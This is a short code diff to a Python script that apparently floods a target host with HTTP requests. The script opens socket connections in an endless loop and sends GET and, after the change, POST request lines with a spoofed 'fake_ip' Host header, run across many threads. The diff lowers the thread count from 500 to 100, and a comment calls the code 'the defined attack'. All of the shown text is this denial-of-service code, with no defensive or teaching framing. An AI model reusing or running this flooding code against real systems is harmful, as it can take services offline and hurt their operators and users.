@@ -30,11 +30,12 @@ while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
             s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
             s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
             s.close()
 
     # Run 500 threads of the defined attack
-    for i in range(500):
+    for i in range(100):
         thread = threading.Thread(target=single_attack)
         thread.start()
 
